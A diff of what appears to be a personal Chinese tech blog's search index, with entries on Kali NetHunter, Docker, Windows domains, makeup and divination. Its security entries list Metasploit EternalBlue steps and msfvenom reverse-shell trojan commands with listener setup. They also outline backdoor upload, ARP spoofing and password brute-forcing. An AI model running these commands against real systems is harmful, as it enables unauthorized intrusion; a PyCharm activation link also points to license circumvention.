-<h2 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h2><p>肯定是需要现有一部root的手机，这个可以看我oppo root的帖子或者网上找相应方法去操作。<br>然后能科学上网，这个其实没有也没关系，但是会比较方便。<br>使用的是面具安装。</p>
-<h2 id="下载镜像"><a href="#下载镜像" class="headerlink" title="下载镜像"></a>下载镜像</h2><p>bing搜索kali，点击下载</p>
-<p><img src="/images/pasted-64.png" alt="upload successful"></p>
-<p>点击移动端，mobile</p>
-<p><img src="/images/pasted-65.png" alt="upload successful"></p>
-<p>点击full的版本，因为我这个没有对应的手机，所以下载的是图中位置的镜像</p>
-<p><img src="/images/pasted-67.png" alt="upload successful"></p>
-<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>在面具里面点击图中的本地安装，找到下载的镜像包，安装就是了<br><img src="/images/pasted-70.png" alt="upload successful"></p>
-<p>安装之后其实一切都安装好了，据说官方支持的root机会自动下载好关键的三个软件，但是我这个瞎搞的root机，没有下载，后来发现官网下载镜像那里有个软件商店可以下载。<br><img src="/images/pasted-72.png" alt="upload successful"></p>
+    <title>msfconsole命令</title>
+    <url>/2024/08/01/msfconsole%E5%91%BD%E4%BB%A4/</url>
+    <content><![CDATA[<h2 id="攻击模块"><a href="#攻击模块" class="headerlink" title="攻击模块"></a>攻击模块</h2><p>软件更新</p>
+<pre><code>apt update # 更新安装包信息；只检查，不更新
+apt upgrade # 更新已安装的软件包，不删除旧包； 
+apt full-upgrade # 升级包，删除旧包
+</code></pre>
+<p>基础使用</p>
+<pre><code>msfconsole //进入框架
+search  ms17_010 //使用search命令查找相关漏洞
+use exploit/windows/smb/ms17_010_eternalblue //使用use进入模块
+info //使用info查看模块信息
+show options //查看参数
+set  RHOST  192.168.100.158 //设置参数
+exploit/run
+</code></pre>
+<p>辅助模块(auxiliary)</p>
+<p>漏洞利用(exploit)</p>
+<p>攻击载荷(payload)：<br>    Stager中几种常见的payload：<br>    windows&#x2F;meterpreter&#x2F;bind_tcp       &#x2F;&#x2F;正向连接<br>    windows&#x2F;meterpreter&#x2F;reverse_tcp    &#x2F;&#x2F;反向连接，常用<br>    windows&#x2F;meterpreter&#x2F;reverse_http   &#x2F;&#x2F;通过监听80端口反向连接<br>    windows&#x2F;meterpreter&#x2F;reverse_https  &#x2F;&#x2F;通过监听443端口反向连接</p>
+<h2 id="木马"><a href="#木马" class="headerlink" title="木马"></a>木马</h2><p>windows木马<br>创建木马</p>
+<pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.110 LPORT=4444 -f exe -o 123.exe
+</code></pre>
+<p>开启kali监听</p>
+<pre><code>启动msfconsole
+开启监听
+    use exploit/multi/handler
+设置tcp监听
+    set payload windows/meterpreter/reverse_tcp
+设置本机ip和端口
+    set
+输入explore开始监听
+</code></pre>
+<p>运行木马后木马上线，进入meterpreter</p>
+<p>后续同上，不做详细解释</p>
+<p>linux elf木马反弹shell创建（msf6版本）</p>
+<pre><code>    msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=xxx.xxx.xxx.xxx LPORT=8888 -f elf &gt; mshell.elf
+</code></pre>
+<p>监听</p>
+<pre><code>msfconsole
+use exploit/multi/handler
+set payload linux/x64/meterpreter/reverse_tcp
+set lhost xxx.xxx.xxx.xxx
+set lport 8888
+run
+</code></pre>
 ]]></content>
       <categories>
-        <category>手机搞机</category>
+        <category>网络安全</category>
+        <category>kali</category>
+        <category>命令</category>
       </categories>
       <tags>
+        <tag>网络安全</tag>
         <tag>kali</tag>
-        <tag>手机root</tag>
+        <tag>渗透命令</tag>
       </tags>
   </entry>
   <entry>
@@ -1339,64 +1397,6 @@ hydra -m cloud -P 密码字典 IP cisco-enable
       </categories>
       <tags>
         <tag>手机root</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>msfconsole命令</title>
-    <url>/2024/08/01/msfconsole%E5%91%BD%E4%BB%A4/</url>
-    <content><![CDATA[<h2 id="攻击模块"><a href="#攻击模块" class="headerlink" title="攻击模块"></a>攻击模块</h2><p>软件更新</p>
-<pre><code>apt update # 更新安装包信息；只检查，不更新
-apt upgrade # 更新已安装的软件包，不删除旧包； 
-apt full-upgrade # 升级包，删除旧包
-</code></pre>
-<p>基础使用</p>
-<pre><code>msfconsole //进入框架
-search  ms17_010 //使用search命令查找相关漏洞
-use exploit/windows/smb/ms17_010_eternalblue //使用use进入模块
-info //使用info查看模块信息
-show options //查看参数
-set  RHOST  192.168.100.158 //设置参数
-exploit/run
-</code></pre>
-<p>辅助模块(auxiliary)</p>
-<p>漏洞利用(exploit)</p>
-<p>攻击载荷(payload)：<br>    Stager中几种常见的payload：<br>    windows&#x2F;meterpreter&#x2F;bind_tcp       &#x2F;&#x2F;正向连接<br>    windows&#x2F;meterpreter&#x2F;reverse_tcp    &#x2F;&#x2F;反向连接，常用<br>    windows&#x2F;meterpreter&#x2F;reverse_http   &#x2F;&#x2F;通过监听80端口反向连接<br>    windows&#x2F;meterpreter&#x2F;reverse_https  &#x2F;&#x2F;通过监听443端口反向连接</p>
-<h2 id="木马"><a href="#木马" class="headerlink" title="木马"></a>木马</h2><p>windows木马<br>创建木马</p>
-<pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.110 LPORT=4444 -f exe -o 123.exe
-</code></pre>
-<p>开启kali监听</p>
-<pre><code>启动msfconsole
-开启监听
-    use exploit/multi/handler
-设置tcp监听
-    set payload windows/meterpreter/reverse_tcp
-设置本机ip和端口
-    set
-输入explore开始监听
-</code></pre>
-<p>运行木马后木马上线，进入meterpreter</p>
-<p>后续同上，不做详细解释</p>
-<p>linux elf木马反弹shell创建（msf6版本）</p>
-<pre><code>    msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=xxx.xxx.xxx.xxx LPORT=8888 -f elf &gt; mshell.elf
-</code></pre>
-<p>监听</p>
-<pre><code>msfconsole
-use exploit/multi/handler
-set payload linux/x64/meterpreter/reverse_tcp
-set lhost xxx.xxx.xxx.xxx
-set lport 8888
-run
-</code></pre>
-]]></content>
-      <categories>
-        <category>网络安全</category>
-        <category>kali</category>
-        <category>命令</category>
-      </categories>
-      <tags>
-        <tag>网络安全</tag>
-        <tag>kali</tag>
-        <tag>渗透命令</tag>
       </tags>
   </entry>
   <entry>
@@ -1565,32 +1565,6 @@ run
       </tags>
   </entry>
   <entry>
-    <title>portainer docker的web管理页面</title>
-    <url>/2024/10/13/portainer-docker%E7%9A%84web%E7%AE%A1%E7%90%86%E9%A1%B5%E9%9D%A2/</url>
-    <content><![CDATA[<h2 id="portainer"><a href="#portainer" class="headerlink" title="portainer"></a>portainer</h2><p>一个web可视化的docker管理页面</p>
-<h2 id="拉取镜像"><a href="#拉取镜像" class="headerlink" title="拉取镜像"></a>拉取镜像</h2><p>先搜索镜像</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker search portainer</span><br></pre></td></tr></table></figure>
-<p>一般我下载最多下载的那几个</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker pull portainer/portainer-ce</span><br></pre></td></tr></table></figure>
-<p>启动</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -d -p 9000:9000 --restart=always -v /var/run/docker.sock:/var/run/docker.sock --name portainer portainer/portainer-ce</span><br></pre></td></tr></table></figure>
-<p>-v 要挂载相关docker守护进程才能让portainer能够管理docker</p>
-<p>-p 映射9000端口，默认http;网上的大哥说8000是k8s需要的端口，9443是https端口，没去验证。</p>
-<p>接下来就可以登录管理了</p>
-<h2 id="初始化配置"><a href="#初始化配置" class="headerlink" title="初始化配置"></a>初始化配置</h2><p>刚进web页面需要设置admin密码，创建账号，这个是直接创建新的管理</p>
-<p>也可通过上传配置文件创建</p>
-<p>选其中一个即可</p>
-]]></content>
-      <categories>
-        <category>系统运维</category>
-        <category>docker</category>
-      </categories>
-      <tags>
-        <tag>docker</tag>
-        <tag>docker命令</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>sqlmap</title>
     <url>/2025/03/05/sqlmap/</url>
     <content><![CDATA[<h2 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h2><p>自动测试注入已找到的sql注入漏洞点</p>
@@ -1742,6 +1716,32 @@ run
 ]]></content>
   </entry>
   <entry>
+    <title>portainer docker的web管理页面</title>
+    <url>/2024/10/13/portainer-docker%E7%9A%84web%E7%AE%A1%E7%90%86%E9%A1%B5%E9%9D%A2/</url>
+    <content><![CDATA[<h2 id="portainer"><a href="#portainer" class="headerlink" title="portainer"></a>portainer</h2><p>一个web可视化的docker管理页面</p>
+<h2 id="拉取镜像"><a href="#拉取镜像" class="headerlink" title="拉取镜像"></a>拉取镜像</h2><p>先搜索镜像</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker search portainer</span><br></pre></td></tr></table></figure>
+<p>一般我下载最多下载的那几个</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker pull portainer/portainer-ce</span><br></pre></td></tr></table></figure>
+<p>启动</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -d -p 9000:9000 --restart=always -v /var/run/docker.sock:/var/run/docker.sock --name portainer portainer/portainer-ce</span><br></pre></td></tr></table></figure>
+<p>-v 要挂载相关docker守护进程才能让portainer能够管理docker</p>
+<p>-p 映射9000端口，默认http;网上的大哥说8000是k8s需要的端口，9443是https端口，没去验证。</p>
+<p>接下来就可以登录管理了</p>
+<h2 id="初始化配置"><a href="#初始化配置" class="headerlink" title="初始化配置"></a>初始化配置</h2><p>刚进web页面需要设置admin密码，创建账号，这个是直接创建新的管理</p>
+<p>也可通过上传配置文件创建</p>
+<p>选其中一个即可</p>
+]]></content>
+      <categories>
+        <category>系统运维</category>
+        <category>docker</category>
+      </categories>
+      <tags>
+        <tag>docker</tag>
+        <tag>docker命令</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>pycharm激活</title>
     <url>/2024/08/10/pycharm%E6%BF%80%E6%B4%BB/</url>
     <content><![CDATA[<h2 id="检查链接"><a href="#检查链接" class="headerlink" title="检查链接"></a>检查链接</h2><p>网址：<a href="https://3.jetbra.in/">https://3.jetbra.in/</a></p>
@@ -1845,6 +1845,45 @@ run
       <tags>
         <tag>switch</tag>
         <tag>大气层</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>windows域部署及管理</title>
+    <url>/2025/04/26/windows%E5%9F%9F%E9%83%A8%E7%BD%B2%E5%8F%8A%E7%AE%A1%E7%90%86/</url>
+    <content><![CDATA[<h2 id="windows域"><a href="#windows域" class="headerlink" title="windows域"></a>windows域</h2><ul>
+<li>单域：在网络中只建立了一个域</li>
+<li>域树：具有连续域名空间的多个域</li>
+<li>域林：由一个或者多个没有形成连续域名空的域树组成</li>
+</ul>
+<h2 id="创建域"><a href="#创建域" class="headerlink" title="创建域"></a>创建域</h2><h3 id="ip和dns设置"><a href="#ip和dns设置" class="headerlink" title="ip和dns设置"></a>ip和dns设置</h3><p>作为域控制器，也作为dns服务器，ip最好是固定不变的，可以设置静态，或者dhcp设置mac保留</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ip：192.168.11.200</span><br><span class="line">dns：127.0.0.1</span><br></pre></td></tr></table></figure>
+
+<h3 id="添加角色功能"><a href="#添加角色功能" class="headerlink" title="添加角色功能"></a>添加角色功能</h3><ol>
+<li>开始</li>
+<li>基于角色或基于功能的安装</li>
+<li>从服务器池中选择服务器<br> 服务器选择自己</li>
+<li>服务器角色<br>选中Active Directory 域服务<br> 点击添加功能</li>
+<li>下一步直到安装完成</li>
+<li>右上角黄色感叹号提示<br> 点击“将此服务器提升为域控制器”<br> 添加新林，设置根域名为“haha.com”<br> dns和全局编录GC勾选，设置密码<br> 确认域名“HAHA”</li>
+<li>下一步直到安装重启</li>
+<li>安装成功，在服务器管理器中查看AD DS</li>
+</ol>
+<h3 id="域账号登录服务器"><a href="#域账号登录服务器" class="headerlink" title="域账号登录服务器"></a>域账号登录服务器</h3><p>账号开始使用原来的账号加上@haha.com，或者是HAHA&#x2F;账号登录</p>
+<h2 id="加入域"><a href="#加入域" class="headerlink" title="加入域"></a>加入域</h2><h3 id="dns设置"><a href="#dns设置" class="headerlink" title="dns设置"></a>dns设置</h3><p>设置dns为DC域控制器的ip</p>
+<h3 id="设置域"><a href="#设置域" class="headerlink" title="设置域"></a>设置域</h3><ol>
+<li>点开此电脑的属性</li>
+<li>选择隶属于域：HAHA</li>
+<li>登录管理员账号</li>
+<li>重启后使用域账号登录</li>
+</ol>
+]]></content>
+      <categories>
+        <category>系统运维</category>
+        <category>windows域</category>
+      </categories>
+      <tags>
+        <tag>windows域</tag>
+        <tag>AD DC</tag>
       </tags>
   </entry>
   <entry>
@@ -2190,45 +2229,6 @@ run
       </tags>
   </entry>
   <entry>
-    <title>windows域部署及管理</title>
-    <url>/2025/04/26/windows%E5%9F%9F%E9%83%A8%E7%BD%B2%E5%8F%8A%E7%AE%A1%E7%90%86/</url>
-    <content><![CDATA[<h2 id="windows域"><a href="#windows域" class="headerlink" title="windows域"></a>windows域</h2><ul>
-<li>单域：在网络中只建立了一个域</li>
-<li>域树：具有连续域名空间的多个域</li>
-<li>域林：由一个或者多个没有形成连续域名空的域树组成</li>
-</ul>
-<h2 id="创建域"><a href="#创建域" class="headerlink" title="创建域"></a>创建域</h2><h3 id="ip和dns设置"><a href="#ip和dns设置" class="headerlink" title="ip和dns设置"></a>ip和dns设置</h3><p>作为域控制器，也作为dns服务器，ip最好是固定不变的，可以设置静态，或者dhcp设置mac保留</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ip：192.168.11.200</span><br><span class="line">dns：127.0.0.1</span><br></pre></td></tr></table></figure>
-
-<h3 id="添加角色功能"><a href="#添加角色功能" class="headerlink" title="添加角色功能"></a>添加角色功能</h3><ol>
-<li>开始</li>
-<li>基于角色或基于功能的安装</li>
-<li>从服务器池中选择服务器<br> 服务器选择自己</li>
-<li>服务器角色<br>选中Active Directory 域服务<br> 点击添加功能</li>
-<li>下一步直到安装完成</li>
-<li>右上角黄色感叹号提示<br> 点击“将此服务器提升为域控制器”<br> 添加新林，设置根域名为“haha.com”<br> dns和全局编录GC勾选，设置密码<br> 确认域名“HAHA”</li>
-<li>下一步直到安装重启</li>
-<li>安装成功，在服务器管理器中查看AD DS</li>
-</ol>
-<h3 id="域账号登录服务器"><a href="#域账号登录服务器" class="headerlink" title="域账号登录服务器"></a>域账号登录服务器</h3><p>账号开始使用原来的账号加上@haha.com，或者是HAHA&#x2F;账号登录</p>
-<h2 id="加入域"><a href="#加入域" class="headerlink" title="加入域"></a>加入域</h2><h3 id="dns设置"><a href="#dns设置" class="headerlink" title="dns设置"></a>dns设置</h3><p>设置dns为DC域控制器的ip</p>
-<h3 id="设置域"><a href="#设置域" class="headerlink" title="设置域"></a>设置域</h3><ol>
-<li>点开此电脑的属性</li>
-<li>选择隶属于域：HAHA</li>
-<li>登录管理员账号</li>
-<li>重启后使用域账号登录</li>
-</ol>
-]]></content>
-      <categories>
-        <category>系统运维</category>
-        <category>windows域</category>
-      </categories>
-      <tags>
-        <tag>windows域</tag>
-        <tag>AD DC</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>windows-好用软件</title>
     <url>/2025/02/24/windows-%E5%A5%BD%E7%94%A8%E8%BD%AF%E4%BB%B6/</url>
     <content><![CDATA[<h2 id="U盘工具"><a href="#U盘工具" class="headerlink" title="U盘工具"></a>U盘工具</h2><h3 id="rufus"><a href="#rufus" class="headerlink" title="rufus"></a>rufus</h3><blockquote>
@@ -2313,6 +2313,126 @@ run
       </tags>
   </entry>
   <entry>
+    <title>化妆笔记</title>
+    <url>/2025/06/18/%E5%8C%96%E5%A6%86%E7%AC%94%E8%AE%B0/</url>
+    <content><![CDATA[<h2 id="🧴-妆前打底"><a href="#🧴-妆前打底" class="headerlink" title="🧴 妆前打底"></a>🧴 妆前打底</h2><ul>
+<li>厚涂乳或霜，直到皮肤摸起来黏黏的、无颗粒感 ✨<br>👉 <strong>重点部位</strong>：鼻翼、额头、眼角（易卡粉处多揉）</li>
+</ul>
+<h2 id="🐼-黑眼圈遮盖"><a href="#🐼-黑眼圈遮盖" class="headerlink" title="🐼 黑眼圈遮盖"></a>🐼 黑眼圈遮盖</h2><ol>
+<li>用指腹打圈激活遮瑕🌀</li>
+<li>用扁平刷沾取遮瑕，从黑眼圈外缘下笔，往上晕染 🌫️</li>
+<li>涂眼角、眼尾、眼皮色素沉着区域 🖌️</li>
+<li>⚠️ 不遮住卧蚕，边缘自然过渡</li>
+</ol>
+<h2 id="🧊-隔离霜"><a href="#🧊-隔离霜" class="headerlink" title="🧊 隔离霜"></a>🧊 隔离霜</h2><ul>
+<li>挤手上晕开后上脸（嘴角、鼻翼、下巴、额头）🌈</li>
+<li>避开遮瑕区域 ❌</li>
+</ul>
+<h2 id="🧽-粉底液"><a href="#🧽-粉底液" class="headerlink" title="🧽 粉底液"></a>🧽 粉底液</h2><ul>
+<li>手上晕开，用粉扑轻拍上脸（不要等干才拍）💧</li>
+<li>上够量，不然易斑驳 ❗</li>
+<li>如果起皮或不服帖，用湿巾擦掉重来 🔄</li>
+</ul>
+<h2 id="✨-液体提亮"><a href="#✨-液体提亮" class="headerlink" title="✨ 液体提亮"></a>✨ 液体提亮</h2><p>🔺 在以下部位画小三角并拍开：</p>
+<ul>
+<li>法令纹下、眼下、下巴、额头、鼻梁、鼻头、眉骨</li>
+</ul>
+<h2 id="🟤-遮瑕（二次）"><a href="#🟤-遮瑕（二次）" class="headerlink" title="🟤 遮瑕（二次）"></a>🟤 遮瑕（二次）</h2><ul>
+<li>用深色遮痘印、痣</li>
+<li>手上晕开再上脸，小面积局部修饰 🕳️</li>
+</ul>
+<h2 id="🌸-膏状腮红"><a href="#🌸-膏状腮红" class="headerlink" title="🌸 膏状腮红"></a>🌸 膏状腮红</h2><ul>
+<li>手上铺开后再上脸</li>
+<li>中间颜色深，两侧浅，晕染过渡自然 🎨</li>
+</ul>
+<h2 id="🧻-定妆"><a href="#🧻-定妆" class="headerlink" title="🧻 定妆"></a>🧻 定妆</h2><ul>
+<li>用干粉扑蘸定妆粉，手上晕开再上脸</li>
+<li>按压上妆，直到摸起来滑滑的不黏腻 🌬️</li>
+</ul>
+<h2 id="🍑-腮红粉"><a href="#🍑-腮红粉" class="headerlink" title="🍑 腮红粉"></a>🍑 腮红粉</h2><ul>
+<li>抖掉多余粉末后轻扫上脸，可延伸至眼影区 🎀</li>
+</ul>
+<h2 id="🪄-阴影修容"><a href="#🪄-阴影修容" class="headerlink" title="🪄 阴影修容"></a>🪄 阴影修容</h2><ul>
+<li>浅+深色混合沾取，抖粉后上脸 🖌️</li>
+<li>山根画“C”形，顺眼窝到眉骨 🌙</li>
+<li>鼻尖“小c”向下晕染，注意山根和鼻尖别连线！🛑</li>
+<li>人中、下唇中间也上些修容 👃👄</li>
+<li>眼尾、眉骨补上小“C”增强骨相</li>
+</ul>
+<h2 id="💡-高光"><a href="#💡-高光" class="headerlink" title="💡 高光"></a>💡 高光</h2><ul>
+<li><p>沾取白色高光 ✨ 抖粉后提亮：</p>
+<ul>
+<li>山根、鼻头、鼻翼、眼骨、眼下三角区</li>
+<li>法令纹、下巴、嘴角向上、太阳穴</li>
+</ul>
+</li>
+</ul>
+<h2 id="🎨-眼影步骤"><a href="#🎨-眼影步骤" class="headerlink" title="🎨 眼影步骤"></a>🎨 眼影步骤</h2><h3 id="🌡️-色调搭配"><a href="#🌡️-色调搭配" class="headerlink" title="🌡️ 色调搭配"></a>🌡️ 色调搭配</h3><ul>
+<li>统一冷暖色调 ❄️🔥，避免混用</li>
+</ul>
+<h3 id="👁️-操作步骤"><a href="#👁️-操作步骤" class="headerlink" title="👁️ 操作步骤"></a>👁️ 操作步骤</h3><ol>
+<li><p><strong>大号刷 + 浅色</strong></p>
+<ul>
+<li>打底，大面积扫眼窝（后宽前窄）</li>
+</ul>
+</li>
+<li><p><strong>中号刷 + 第二浅色</strong></p>
+<ul>
+<li>从睫毛根部开始，左右扫再向上晕染</li>
+</ul>
+</li>
+<li><p><strong>小号刷</strong></p>
+<ul>
+<li>从后眼尾往前带色，边缘自然 🌫️</li>
+</ul>
+</li>
+<li><p><strong>调整加深</strong>：贴睫毛后若不够浓可补色</p>
+</li>
+</ol>
+<h2 id="👀-假睫毛-睫毛夹"><a href="#👀-假睫毛-睫毛夹" class="headerlink" title="👀 假睫毛 &amp; 睫毛夹"></a>👀 假睫毛 &amp; 睫毛夹</h2><h3 id="🔧-夹睫毛"><a href="#🔧-夹睫毛" class="headerlink" title="🔧 夹睫毛"></a>🔧 夹睫毛</h3><ul>
+<li>睫毛夹靠近睫毛根部夹两下，抬手腕二次加压</li>
+</ul>
+<h3 id="🧷-贴假睫毛"><a href="#🧷-贴假睫毛" class="headerlink" title="🧷 贴假睫毛"></a>🧷 贴假睫毛</h3><ul>
+<li>上下睫毛配合协调 ✅</li>
+<li>镊子干净无胶 💅</li>
+<li>胶干到半湿时贴上，推一推更服帖 👁️</li>
+</ul>
+<h3 id="⬇️-下睫毛"><a href="#⬇️-下睫毛" class="headerlink" title="⬇️ 下睫毛"></a>⬇️ 下睫毛</h3><ul>
+<li>呈放射状贴，不要贴成直线</li>
+<li>第1簇从眼白一半处开始贴，贴好后轻推 ✅</li>
+</ul>
+<blockquote>
+<p>✨ 贴好后可加深眼影</p>
+</blockquote>
+<h2 id="🌈-卧蚕（眼睑下至）"><a href="#🌈-卧蚕（眼睑下至）" class="headerlink" title="🌈 卧蚕（眼睑下至）"></a>🌈 卧蚕（眼睑下至）</h2><ul>
+<li>刀锋刷沾色，从瞳孔下方晕染到眼白前后1&#x2F;2</li>
+<li>打造“亮-暗-亮”结构的立体卧蚕 💫</li>
+</ul>
+<h2 id="✂️-双眼皮贴"><a href="#✂️-双眼皮贴" class="headerlink" title="✂️ 双眼皮贴"></a>✂️ 双眼皮贴</h2><ul>
+<li>从中间开始贴，压褶皱线</li>
+<li>可剪半片贴右眼，调高后眼皮线 👁️</li>
+</ul>
+<h2 id="🖋️-眼线"><a href="#🖋️-眼线" class="headerlink" title="🖋️ 眼线"></a>🖋️ 眼线</h2><ol>
+<li>先用眉笔打草图 ✏️</li>
+<li>连接两段线条并填色</li>
+<li>补画后三分之一内眼线 🎯</li>
+</ol>
+<h2 id="✨-闪片点缀"><a href="#✨-闪片点缀" class="headerlink" title="✨ 闪片点缀"></a>✨ 闪片点缀</h2><ul>
+<li>眼中段、眼头处可加亮片 💎</li>
+<li>用干净刷子在卧蚕提亮，形成明暗对比 ✨</li>
+</ul>
+]]></content>
+      <categories>
+        <category>生活</category>
+        <category>化妆</category>
+      </categories>
+      <tags>
+        <tag>生活</tag>
+        <tag>化妆</tag>
+        <tag>笔记</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>压缩包密码爆破</title>
     <url>/2024/08/10/%E5%8E%8B%E7%BC%A9%E5%8C%85%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/</url>
     <content><![CDATA[<h2 id="使用zip2john-hash值破解"><a href="#使用zip2john-hash值破解" class="headerlink" title="使用zip2john hash值破解"></a>使用zip2john hash值破解</h2><p>生成压缩包hash值</p>
@@ -2327,25 +2447,6 @@ run
         <tag>网络安全</tag>
         <tag>kali</tag>
         <tag>hashcat</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>安全-内网渗透</title>
-    <url>/2024/08/01/%E5%AE%89%E5%85%A8-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/</url>
-    <content><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>主机存活<br>    ettercap -G 蜘蛛<br>    nmap<br>    nmap -sS 网段</p>
-<p>漏洞搜集<br>    awvs			网站扫描<br>    gvm(openvas)	系统扫描<br>    nmap<br>    nmap –script&#x3D;vuln &#x2F;&#x2F;常见漏洞<br>    nmap –script-default &#x2F;&#x2F;默认收集信息脚本</p>
-<h2 id="进入目标后"><a href="#进入目标后" class="headerlink" title="进入目标后"></a>进入目标后</h2><p>提权<br>    创建高权限用户<br>        windows<br>            net use<br>        linux<br>            user add</p>
-<p>留后门<br>    创建木马<br>        木马(msfconsole)<br>    上传木马<br>        meterpreter<br>            upload</p>
-<h2 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h2><p>改变流量走向<br>    ettercap(arp欺骗、dns劫持等)<br>    arpspoof<br>    arpspoof -i 网卡名称 -t 目标IP 网关</p>
-<p>爆破密码<br>    hydra（九头蛇）<br>    msfconsole（爆破密码模块）</p>
-<p>漏洞攻击<br>    msfconsole（漏洞攻击目录）</p>
-]]></content>
-      <categories>
-        <category>网络安全</category>
-        <category>kali</category>
-      </categories>
-      <tags>
-        <tag>网络安全</tag>
       </tags>
   </entry>
   <entry>
@@ -2429,6 +2530,25 @@ run
       </categories>
       <tags>
         <tag>菜谱</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>安全-内网渗透</title>
+    <url>/2024/08/01/%E5%AE%89%E5%85%A8-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/</url>
+    <content><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>主机存活<br>    ettercap -G 蜘蛛<br>    nmap<br>    nmap -sS 网段</p>
+<p>漏洞搜集<br>    awvs			网站扫描<br>    gvm(openvas)	系统扫描<br>    nmap<br>    nmap –script&#x3D;vuln &#x2F;&#x2F;常见漏洞<br>    nmap –script-default &#x2F;&#x2F;默认收集信息脚本</p>
+<h2 id="进入目标后"><a href="#进入目标后" class="headerlink" title="进入目标后"></a>进入目标后</h2><p>提权<br>    创建高权限用户<br>        windows<br>            net use<br>        linux<br>            user add</p>
+<p>留后门<br>    创建木马<br>        木马(msfconsole)<br>    上传木马<br>        meterpreter<br>            upload</p>
+<h2 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h2><p>改变流量走向<br>    ettercap(arp欺骗、dns劫持等)<br>    arpspoof<br>    arpspoof -i 网卡名称 -t 目标IP 网关</p>
+<p>爆破密码<br>    hydra（九头蛇）<br>    msfconsole（爆破密码模块）</p>
+<p>漏洞攻击<br>    msfconsole（漏洞攻击目录）</p>
+]]></content>
+      <categories>
+        <category>网络安全</category>
+        <category>kali</category>
+      </categories>
+      <tags>
+        <tag>网络安全</tag>
       </tags>
   </entry>
   <entry>
@@ -2621,46 +2741,77 @@ run
       </tags>
   </entry>
   <entry>
-    <title>算命</title>
-    <url>/2025/02/05/%E7%AE%97%E5%91%BD/</url>
-    <content><![CDATA[<h2 id="六神"><a href="#六神" class="headerlink" title="六神"></a>六神</h2><h3 id="手势位置"><a href="#手势位置" class="headerlink" title="手势位置"></a>手势位置</h3><p>左手三指，分别是大安、流连、速喜、赤口、小吉、空亡<br><img src="/images/pasted-71.png" alt="upload successful"></p>
-<p>速记：大、流、速、赤、小、空。</p>
-<h3 id="详解"><a href="#详解" class="headerlink" title="详解"></a>详解</h3><h4 id="大安"><a href="#大安" class="headerlink" title="大安"></a>大安</h4><p>1、身不动时（如果算一个人在干什么）<br>2、五行：属木<br>3、方位：东<br>4、神煞：青龙<br>5、数字：1、5、7<br>6、安心吉祥的意思</p>
-<p>口诀：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">大安事事昌</span><br><span class="line">求谋在东方</span><br><span class="line">失物去不远</span><br><span class="line">宅家保平安</span><br><span class="line">行人身未动</span><br><span class="line">病者主无妨</span><br><span class="line">将军回田野</span><br><span class="line">仔细更推详</span><br></pre></td></tr></table></figure>
-
-<h4 id="留连"><a href="#留连" class="headerlink" title="留连"></a>留连</h4><p>1、人未归时<br>2、五行属水<br>3、黑色<br>4、方位北<br>5、玄武<br>6、数字：2、8、10<br>7、有暗昧不明、延迟、纠缠、拖延、漫长之意</p>
-<p>口诀：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">留连事难成</span><br><span class="line">求谋日未明</span><br><span class="line">官事凡宜缓</span><br><span class="line">去者未回程</span><br><span class="line">失物南方见</span><br><span class="line">急讨方心称</span><br><span class="line">更须防口舌</span><br><span class="line">人口且平平</span><br></pre></td></tr></table></figure>
-
-<h4 id="速喜"><a href="#速喜" class="headerlink" title="速喜"></a>速喜</h4><p>1、人即至时<br>2、五行属火<br>3、红色<br>4、方位为南方<br>5、数字：3,6,9<br>6、有快速、吉利、时机已到之意</p>
-<p>口诀：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">速喜喜来临</span><br><span class="line">求财向南行</span><br><span class="line">失物申未午（南、西南）</span><br><span class="line">逢人路上寻</span><br><span class="line">官事有福德</span><br><span class="line">病者无祸侵</span><br><span class="line">田宅六畜吉</span><br><span class="line">行人有信音</span><br></pre></td></tr></table></figure>
-
-<h4 id="赤口"><a href="#赤口" class="headerlink" title="赤口"></a>赤口</h4><p>1、官事凶时<br>2、五行属金<br>3、白色<br>4、西方<br>5、白虎<br>6、数字：4，7，10<br>7、有不吉、惊恐、凶险、口舌是非之意</p>
-<p>口诀：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">赤口主口舌</span><br><span class="line">官非切宜防</span><br><span class="line">失物急去寻</span><br><span class="line">行人有惊慌</span><br><span class="line">鸡犬（六畜）多作怪</span><br><span class="line">病者出西方</span><br><span class="line">更须防咀咒</span><br><span class="line">诚恐染瘟皇</span><br></pre></td></tr></table></figure>
-
